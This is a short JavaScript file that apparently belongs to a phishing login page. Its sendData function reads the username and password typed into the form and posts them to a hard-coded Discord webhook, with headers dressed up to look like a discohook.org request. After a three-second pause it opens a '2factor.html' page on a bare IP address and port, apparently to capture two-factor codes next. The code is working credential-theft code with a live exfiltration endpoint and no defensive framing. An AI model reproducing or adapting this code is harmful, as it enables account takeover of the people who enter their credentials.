var sleepES5 = function(ms){
    var esperarHasta = new Date().getTime() + ms;
    while(new Date().getTime() < esperarHasta) continue;
};
function sendData() {
    var username = document.getElementById("username").value
    var password = document.getElementById("password").value
    fetch('https://discord.com/api/v10/webhooks/1186035319968112821/M-M5ibxkzx4Q0QhNXpWamG-HMA-VhoY6slD__6k9wUSzkGtqnuT4UV_2MPop6wI6q1lq?wait=true', {
        method: 'POST',
        headers: {
            'Host': 'discord.com',
            'Accept': 'application/json',
            'Accept-Language': 'en',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'https://discohook.org/',
            'Content-Type': 'application/json',
            'Content-Length': '23',
            'Origin': 'https://discohook.org',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'Te': 'trailers'
        },
        body: JSON.stringify({
            'content': `username:${username}\npassword:${password}`
        })
    });
    sleepES5(3000);
    window.open("http://190.249.6.188:7777/2factor.html")
    

}